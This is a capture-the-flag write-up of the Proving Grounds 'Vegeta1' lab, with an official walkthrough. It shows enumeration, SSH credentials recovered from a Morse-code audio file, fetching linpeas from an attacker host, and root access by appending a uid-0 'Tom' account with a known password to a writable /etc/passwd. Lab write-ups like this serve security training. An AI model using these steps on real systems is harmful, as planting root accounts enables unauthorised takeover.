---
title: Vegeta1
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Vegeta1
## OS
## Level

---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Vegeta1]
└─$ sudo nmap -Pn -p- -sSCV -A -oN full_tcp-scan.txt --open 192.168.201.73 
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-18 06:13 +0900
Nmap scan report for 192.168.201.73
Host is up (0.090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1f:31:30:67:3f:08:30:2e:6d:ae:e3:20:9e:bd:6b:ba (RSA)
|   256 7d:88:55:a8:6f:56:c8:05:a4:73:82:dc:d8:db:47:59 (ECDSA)
|_  256 cc:de:de:4e:84:a8:91:f5:1a:d6:d2:a6:2e:9e:1c:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   89.50 ms 192.168.45.1
2   89.50 ms 192.168.45.254
3   89.57 ms 192.168.251.1
4   89.64 ms 192.168.201.73

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.19 seconds
```

## HTTP
### 80

![](../../../assets/images/Pasted%20image%2020260519023318.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Vegeta1]
└─$ whatweb -a 3 http://192.168.128.73
http://192.168.128.73 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.128.73] 
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Vegeta1]
└─$ feroxbuster \
-u http://target \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \ 
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

![](../../../assets/images/Pasted%20image%2020260519023754.png)

![](../../../assets/images/Pasted%20image%2020260519023820.png)

http://192.168.128.73/find_me/find_me.html

![](../../../assets/images/Pasted%20image%2020260519024036.png)

![](../../../assets/images/Pasted%20image%2020260519024152.png)

```zsh
<!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== -->
```

Decoded

```zsh
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
```

*Like SSH Key but it is Image file.*

![](../../../assets/images/Pasted%20image%2020260519034216.png)

## zbarimg
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Vegeta1]
└─$ zbarimg find_me.png 
QR-Code:Password : topshellv
scanned 1 barcode symbols from 1 images in 0.04 seconds
```

topshellv

*This QR is a rabbit hole*

---

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Vegeta1]
└─$ feroxbuster \
-u http://192.168.128.73/ \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt \
--dont-scan manual
```
- --dont-scan manual

![](../../../assets/images/Pasted%20image%2020260519040312.png)

http://192.168.128.73/bulma/hahahaha.wav

## Decode mourse code

![](../../../assets/images/Pasted%20image%2020260519040621.png)

```zsh
USER : TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBML)
```

DeepL

![](../../../assets/images/Pasted%20image%2020260519041653.png)

- TRUNKS -> trunks
- US3R(S IN DOLLARS SYMBML) -> u$3r

---

# Initial Access

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Vegeta1]
└─$ ssh trunks@192.168.128.73
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
trunks@192.168.128.73's password: 
Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
trunks@Vegeta:~$
```

```zsh
trunks@Vegeta:~$ cat local.txt

trunks@Vegeta:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens35: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:b8:87 brd ff:ff:ff:ff:ff:ff
    inet 192.168.128.73/24 brd 192.168.128.255 scope global ens35
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:b887/64 scope link 
       valid_lft forever preferred_lft forever
```

---

# Privilege Escalation

```zsh
trunks@Vegeta:~$ wget http://192.168.45.160:8000/linpeas.sh -O /tmp/linpeas.sh
--2026-05-19 01:08:12--  http://192.168.45.160:8000/linpeas.sh
Connecting to 192.168.45.160:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1031313 (1007K) [application/x-sh]
Saving to: ‘/tmp/linpeas.sh’

/tmp/linpeas.sh              100%[==============================================>]   1007K  1.45MB/s    in 0.7s    

2026-05-19 01:08:13 (1.45 MB/s) - ‘/tmp/linpeas.sh’ saved [1031313/1031313]

trunks@Vegeta:~$ 
```

```zsh
trunks@Vegeta:~$ chmod +x /tmp/linpeas.sh
```

```zsh
/tmp/linpeas.sh

╔══════════╣ Searching passwords in history files (T1552.001)
/home/trunks/.bash_history:perl -le ‘print crypt(“Password@973″,”addedsalt”)’                                       
/home/trunks/.bash_history:perl -le 'print crypt("Password@973","addedsalt")'
/home/trunks/.bash_history:echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
/home/trunks/.bash_history:echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
/home/trunks/.bash_history:su Tom
/home/trunks/.bash_history:sudo apt-get install vim
/home/trunks/.bash_history:su root
```

![](../../../assets/images/Pasted%20image%2020260519045910.png)

```zsh
trunks@Vegeta:~$ ls -la /etc/passwd
-rw-r--r-- 1 trunks root 1539 May 19 01:27 /etc/passwd
```

```zsh
trunks@Vegeta:~$ echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
```

```zsh
trunks@Vegeta:~$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash
```

```zsh
trunks@Vegeta:~$ su Tom
Password: 
root@Vegeta:/home/trunks# 
```

```zsh
root@Vegeta:/home/trunks# id
uid=0(root) gid=0(root) groups=0(root)
root@Vegeta:/home/trunks# 
root@Vegeta:/home/trunks# cat /root/proof.txt

root@Vegeta:/home/trunks# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens35: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:ab:b8:87 brd ff:ff:ff:ff:ff:ff
    inet 192.168.128.73/24 brd 192.168.128.255 scope global ens35
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:b887/64 scope link 
       valid_lft forever preferred_lft forever
```

<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation Guide for Vegeta1
Summary
This machine is exploited by recovering SSH credentials, which are encoded in Morse code inside an audio file. It is escalated by abusing misconfigured file permissions on /etc/passwd.

Enumeration
Nmap
We start off by running an nmap scan:

kali@kali:~# sudo nmap 192.168.120.161
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-04 09:50 EDT
Nmap scan report for 192.168.120.161
Host is up (0.039s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Gobuster
Next, run a gobuster scan with the wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt as follows:

kali@kali:~# gobuster dir -u http://192.168.120.161/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s '200,204,301,302,307,403,500' -e
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.120.161/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,403,500
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/08/04 10:23:13 Starting gobuster
===============================================================
http://192.168.120.161/img (Status: 301)
http://192.168.120.161/image (Status: 301)
http://192.168.120.161/admin (Status: 301)
http://192.168.120.161/manual (Status: 301)
http://192.168.120.161/server-status (Status: 403)
http://192.168.120.161/bulma (Status: 301)
===============================================================
2020/08/04 10:35:05 Finished
===============================================================
From this scan, directory /bulma is discovered.

Web Enumeration
Navigating to /bulma, we locate a wave file hahahaha.wav:

kali@kali:~# curl http://192.168.120.161/bulma/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
...
<tr><td valign="top"><img src="/icons/sound2.gif" alt="[SND]"></td><td><a href="hahahaha.wav">hahahaha.wav</a></td><td align="right">2020-06-28 18:19  </td><td align="right">231K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
...
We will download this file for further investigation:

kali@kali:~# wget http://192.168.120.161/bulma/hahahaha.wav
--2020-08-04 11:03:30--  http://192.168.120.161/bulma/hahahaha.wav
Connecting to 192.168.120.161:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 236124 (231K) [audio/x-wav]
Saving to: ‘hahahaha.wav’

hahahaha.wav                   100%[===================================================>] 230.59K   482KB/s    in 0.5s    

2020-08-04 11:03:30 (482 KB/s) - ‘hahahaha.wav’ saved [236124/236124]
Exploitation
Morse Code
Listening to the wave file, it sounds like Morse code. We can use an online Morse code audio decoder like https://morsecode.world/international/decoder/audio-decoder-adaptive.html to decode the sound. After decoding, we obtain the following message:

A TT TTT T TTT T7 TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)
This can be interpreted as:

Username: TRUNKS

Password: U$3R

SSH
By the Unix standard of lower-case usernames, we will try the username password pair trunks:u$3r to SSH into the target:

kali@kali:~# ssh trunks@192.168.120.161
trunks@192.168.120.161's password: 
Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
...
trunks@Vegeta:~$ id
uid=1000(trunks) gid=1000(trunks) groups=1000(trunks),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
Escalation
In the home directory /home/trunks/, file .bash_history is present:

trunks@Vegeta:~$ ls -la
total 28
drwxr-xr-x 3 trunks trunks 4096 Jun 28 21:32 .
drwxr-xr-x 3 root   root   4096 Jun 28 17:37 ..
-rw------- 1 trunks trunks  382 Jun 28 21:36 .bash_history
-rw-r--r-- 1 trunks trunks  220 Jun 28 17:37 .bash_logout
-rw-r--r-- 1 trunks trunks 3526 Jun 28 17:37 .bashrc
drwxr-xr-x 3 trunks trunks 4096 Jun 28 19:45 .local
-rw-r--r-- 1 trunks trunks  807 Jun 28 17:37 .profile
Looking inside it shows the following contents:

trunks@Vegeta:~$ cat .bash_history 
perl -le ‘print crypt(“Password@973″,”addedsalt”)’
perl -le 'print crypt("Password@973","addedsalt")'
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd[/sh]
echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
ls
su Tom
ls -la
cat .bash_history 
sudo apt-get install vim
apt-get install vim
su root
cat .bash_history 
exit
We see the user Tom referenced in the bash history; however, the user does not exist in /etc/passwd:

trunks@Vegeta:~$ cat /etc/passwd | grep Tom
trunks@Vegeta:~$
Moreover, checking file permissions of /etc/passwd, the user trunks is able to write to it:

trunks@Vegeta:~$ ls -la /etc/passwd
-rw-r--r-- 1 trunks root 1486 Jun 28 21:23 /etc/passwd
In fact, the contents of /home/trunks/.bash_history hints directly of what should be appended to /etc/passwd. We can escalate our privilege to root as follows (password will be Password@973):

trunks@Vegeta:~$ echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
trunks@Vegeta:~$ su Tom
Password: 
root@Vegeta:/home/trunks# id
uid=0(root) gid=0(root) groups=0(root)
```

</details>